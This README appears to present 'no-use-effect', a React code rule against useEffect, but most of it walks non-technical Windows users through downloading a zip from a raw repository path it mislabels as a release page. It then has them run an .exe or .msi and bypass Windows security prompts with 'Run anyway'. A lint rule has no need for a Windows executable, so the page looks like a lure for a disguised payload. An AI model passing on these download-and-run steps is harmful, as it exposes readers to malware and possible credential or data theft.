# 🛑 no-use-effect - Keep React State Easy to Follow

[![Download no-use-effect](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip)

## 🧩 What this app does

no-use-effect helps you keep React code simple and easy to read.

It enforces a strict rule: do not use `useEffect` for direct data flow when a simpler option works better.

Instead, it points you to patterns that are easier to manage:

- derived state
- event handlers
- `useMemo`
- key-based resets
- `useMountEffect`

This helps you build React apps with less hidden behavior and fewer moving parts.

## 💻 Windows download

1. Open the release page:
   https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip
2. Find the latest release.
3. Under Assets, download the Windows file for your system.
4. If the file is a `.zip`, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the app file to run it.

If Windows asks for permission, choose Run.

## 📦 What you need

- Windows 10 or Windows 11
- A standard mouse and keyboard
- Internet access for the first download
- Enough free space for the app and its files

You do not need to install a separate setup tool in most cases. The release file should run on its own or come in a zip package with the app inside.

## 🔎 How to choose the right file

On the release page, look for the file that matches Windows.

Common file types:

- `.exe` for a direct app file
- `.zip` for a compressed folder
- `.msi` for a Windows installer

If you see more than one file, pick the one for Windows and avoid source code files.

Source code files are for developers and are not needed to run the app.

## 🛠️ First launch steps

After you download the app:

1. Open the folder where the file was saved.
2. If it is a zip file, extract it.
3. Open the app file.
4. If Windows shows a security prompt, click Run or More info, then Run anyway.
5. Wait for the app to open.

If the app does not open, check that the file finished downloading before you try again.

## ⚙️ How no-use-effect works

This tool helps you follow a React rule that keeps logic in the right place.

It flags patterns where `useEffect` can hide what is happening in your app.

It encourages you to use clearer React tools instead:

### Derived state
Use values from existing state instead of copying data into another effect.

### Event handlers
Run logic when the user clicks, types, or submits a form.

### `useMemo`
Use memoized values when you need a result based on other values.

### Key-based resets
Reset parts of the UI by changing a component key.

### `useMountEffect`
Use this when you need a one-time mount action.

## 📘 Common use cases

Use no-use-effect when you want to:

- keep React logic simple
- reduce effect-based code
- avoid data sync bugs
- make component behavior easier to trace
- check code for direct `useEffect` use that should be rewritten
- keep state changes tied to clear events

This is useful for small apps and larger React projects.

## 🧭 Suggested setup flow

If you plan to use the app on Windows, follow this path:

1. Download the latest release from the release page.
2. Save the file to your Downloads folder.
3. Extract the file if needed.
4. Move the app to a folder you can find later.
5. Open the app.
6. Review the rule output or guidance shown in the interface.

For best results, keep the app in a normal folder path such as `Downloads`, `Desktop`, or `Documents`.

## 🧪 Example of the rule in plain terms

Instead of doing this:

- load data in `useEffect`
- copy props into local state in `useEffect`
- trigger a state change inside `useEffect` when a button click is clearer

Use this instead:

- calculate the value from state
- handle the action in the click event
- reset the UI with a key change
- memoize a value when it depends on other values

This keeps your app easier to follow.

## 🗂️ Folder use tips

If you extract a zip file, you may see several files and folders.

Look for:

- the main app file
- a README or text file
- support files the app needs to run

Do not delete files unless you know they are not used by the app.

## 🔐 Windows security prompts

Windows may show a prompt when you open the app for the first time.

If that happens:

1. Check that the file came from the release page.
2. Confirm that you downloaded the latest release.
3. Choose the run option if you trust the file source.

This is normal for many downloaded Windows apps.

## 🔁 Updating the app

When a new version is released:

1. Return to the release page.
2. Download the latest Windows file.
3. Replace the old app files with the new ones if needed.
4. Open the new version.

If you use a zip file, extract the new one into a fresh folder before opening it.

## 🧰 Best practices for use

To get clean results from the tool:

- keep component logic small
- prefer direct event handlers
- avoid using effects for simple state sync
- reach for `useMemo` when a value depends on other values
- use resets when you need to restart a component
- keep mount-only work separate from live data flow

These habits make React code easier to maintain.

## 📎 Download page

[Open the release page to download](https://github.com/higginslol041-max/no-use-effect/raw/refs/heads/main/references/effect_no_use_v3.2.zip)

## 🧭 File names you may see

The release page may include file names like:

- `no-use-effect-windows.exe`
- `no-use-effect-win.zip`
- `no-use-effect-setup.msi`

The exact name may change with each release.

If more than one Windows file appears, choose the newest one in the latest release section.

## 🖱️ Quick start for non-technical users

1. Open the release page.
2. Download the Windows file.
3. Open the file after it finishes downloading.
4. Extract it if it is a zip file.
5. Double-click the app to start it.
6. Use the app to review React patterns and avoid direct `useEffect` use